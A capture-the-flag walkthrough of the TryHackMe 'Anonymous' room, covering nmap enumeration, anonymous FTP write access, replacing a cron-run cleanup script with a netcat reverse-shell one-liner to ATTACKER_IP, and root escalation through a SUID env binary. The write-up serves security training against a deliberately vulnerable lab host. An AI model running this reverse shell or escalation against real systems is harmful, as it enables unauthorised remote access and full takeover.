---
title: "Anonymous — Writeup"
author: "n0l1v3sm4tt3r"
categories: [THM]
tags: [ftp, cron, crontab, reverse-shell, suid, env]
media_subpath: "/images/thm-anonymous/"
image:
  path: logo.png
---

## Table of Contents

1. [Introduction](#introduction)
2. [Recon / Basic Enumeration](#recon--basic-enumeration)
3. [Anonymous FTP](#anonymous-ftp)
4. [Shell as namelessone by injecting clean file](#shell-as-namelessone-by-injecting-clean-file)
5. [Spawn a TTY shell](#spawn-a-tty-shell)
6. [From namelessone to root](#from-namelessone-to-root)

---

## Introduction

> **URL**: https://tryhackme.com/room/anonymous  
> **Difficulty**: Medium  
> **Victim IP**: 10.10.147.209  

---

# Recon / Basic Enumeration

## Nmap scan

```bash
mkdir nmap;nmap -A -T5 -Pn 10.10.147.209 -oN nmap/basic.txt
````

```console
Nmap scan report for 10.10.147.209
Host is up (0.030s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.47.187
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Aggressive OS guesses: Linux 4.15 (99%), Android 9 - 10 (Linux 4.9 - 4.14) (96%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.4 (95%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (94%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.14) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2025-10-26T12:39:40+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-26T12:39:40
|_  start_date: N/A

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   28.30 ms 10.8.0.1
2   28.36 ms 10.10.147.209

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

FTP allows anonymous login — this is the initial attack vector.

---

## Anonymous FTP

### Get the files

Connect to the FTP server using anonymous credentials (`ftp:ftp` or `anonymous:anonymous`) and list the `scripts` directory which is world-writable:

```bash
$ ftp 10.10.147.209
# login...
ftp> ls
scripts
ftp> cd scripts
ftp> prompt off
ftp> mget *
```

Files of interest downloaded from `/scripts`:

* `removed_files.log` (log file)
* `clean.sh` (cleanup script)

`removed_files.log` contents (shows repeated "nothing to delete"):

```text
$ cat removed_files.log
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
... (repeated lines)
```

![Removed logs](removedlogs.png)

Original `clean.sh` contents (as downloaded):

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

![clean.sh script](clean.png)

> **Observation:** The script is served by the FTP `scripts` directory and is writable by the anonymous FTP user. Replacing this script with a reverse-shell payload will cause it to run as the account that executes the cleanup, yielding a callback.

---

## Shell as namelessone by injecting clean file

Replace `clean.sh` with a reverse-shell payload. (All reverse-shell one-liners used here come from [revshells website](https://revshells.com)) Example payload used:

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

On the attacker machine, listen for the callback:

```bash
nc -nlvp <ATTACKER_PORT>
```

Upload the modified `clean.sh` via FTP and wait for the cron job to run (the log suggests repeated runs — likely every minute):

```bash
$ ftp 10.10.147.209
# use the same creds as before
ftp> cd scripts
ftp> put clean.sh
```

![put clean.sh](put_clean.png)

Once the cron executes the script, the listener receives a connection.

![Netcat callback receiving reverse shell](callback.png)

---

### Spawn a TTY shell

After receiving the initial connection, spawn a proper interactive shell:

```bash
export TERM=xterm
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

At this point you should have a shell as the user under which the cleanup script runs (in this writeup that user is `namelessone`).

(When appropriate, retrieve the user flag.)

![user.txt (redacted)](userflag.png)

---

## From namelessone to root

### Enumerate SUID binaries

Search for files with the SUID bit set to find potential misconfigurations:

```bash
find / -type f -perm -4000 2>/dev/null
```

The scan reveals `/usr/bin/env` has the SUID bit set:

```
/usr/bin/env
```

![SUID on /usr/bin/env](suid.png)

### Getting a root shell

Check GTFOBins for `env` and follow the technique to escalate privileges.

![GTFOBins PoC](gtfo.png)

**GTFOBins PoC used:**

```bash
sudo install -m =xs $(which env) .
./env /bin/sh -p
```

The essential command to obtain a root shell on this host is:

```bash
/usr/bin/env /bin/sh -p
```

This spawns a shell with elevated privileges because `env` is SUID-root on this machine. Execute `/usr/bin/env /bin/sh -p` to get a root shell.

![root shell](root.png)

---